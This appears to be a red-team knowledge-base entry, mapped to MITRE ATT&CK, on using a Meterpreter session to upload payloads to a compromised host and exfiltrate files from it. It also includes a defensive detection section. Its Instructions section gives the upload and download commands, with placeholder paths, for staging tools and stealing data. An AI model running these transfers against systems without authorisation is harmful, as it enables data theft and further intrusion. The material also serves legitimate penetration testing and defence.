---
type: procedure
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - '[[techniques/Ingress Tool Transfer|T1105 - Ingress Tool Transfer]]'
  - >-
    [[techniques/Exfiltration Over C2 Channel|T1041 - Exfiltration Over C2
    Channel]]
sub_techniques: []
tags:
  - Metasploit
  - Meterpreter
  - File-Transfer
  - Upload-Download
commands:
  - '[[commands/meterpreter-download-file]]'
  - '[[commands/meterpreter-upload-file]]'
platforms:
  - Windows
  - Linux
  - macOS
tools:
  - '[[tools/Metasploit]]'
skill_level: beginner
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Meterpreter-File-Transfer

## Summary

This procedure demonstrates how to use a Meterpreter session to upload files from the attacker's machine to the target or download files from the target to the attacker. It is commonly used for delivering additional payloads, tools, or exfiltrating sensitive data during post-exploitation phases.

## Description

Meterpreter, a payload within the Metasploit Framework, provides an advanced, multi-platform shell for interacting with compromised hosts. The file transfer capabilities allow seamless movement of files over the established command and control (C2) channel without requiring additional network tools. Uploads can deliver executables, scripts, or configuration files to enable further persistence or escalation, while downloads facilitate data theft such as documents, credentials, or logs. Optional compression and encryption can be applied to evade detection, though this procedure focuses on basic transfers. This technique assumes an active Meterpreter session and is applicable in scenarios where direct file access is needed without alerting host-based defenses.

## Requirements

1. An active Meterpreter session established via Metasploit (e.g., through an exploit or existing payload).
2. Metasploit Framework installed on the attacker's machine.
3. Network connectivity between attacker and target for the C2 channel.
4. Basic knowledge of file paths on both attacker and target systems.

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected network traffic patterns indicative of C2 communications, such as irregular data flows from compromised hosts.
- Implement file integrity monitoring (FIM) to detect unauthorized file creations or modifications on endpoints.
- Use endpoint detection and response (EDR) tools to identify Meterpreter processes or anomalous shell activities.
- Enforce application whitelisting to prevent execution of uploaded malicious files.
- Segment networks to limit lateral movement and data exfiltration paths.

## Objectives

1. Transfer tools or payloads to the target for further exploitation.
2. Exfiltrate sensitive files from the target to the attacker's machine.
3. Maintain operational stealth by using the existing C2 channel for transfers.

## Instructions

### Step 1: Upload a File to the Target

**Context**: This step uploads a file from the attacker's local system to the target, renaming it if needed. It is useful for staging payloads or tools on the compromised host. Ensure the target path is writable and use absolute paths for precision.

**Command** ([[commands/meterpreter-upload-file]]):
```meterpreter
upload /local/path/to/source_file /remote/path/destination_file
```

> The `upload` command transfers the specified local file to the remote location. Success is indicated by a confirmation message showing bytes transferred. Verify by listing the remote directory with `ls` in Meterpreter.

### Step 2: Download a File from the Target

**Context**: This step retrieves a file from the target back to the attacker's machine. It is essential for exfiltrating data like configuration files or logs. Specify the exact remote path to avoid errors.

**Command** ([[commands/meterpreter-download-file]]):
```meterpreter
download /remote/path/source_file /local/path/destination_file
```

> The `download` command pulls the remote file to the local system. Expect a progress indicator and byte count upon completion. Confirm the file integrity post-transfer using checksums.
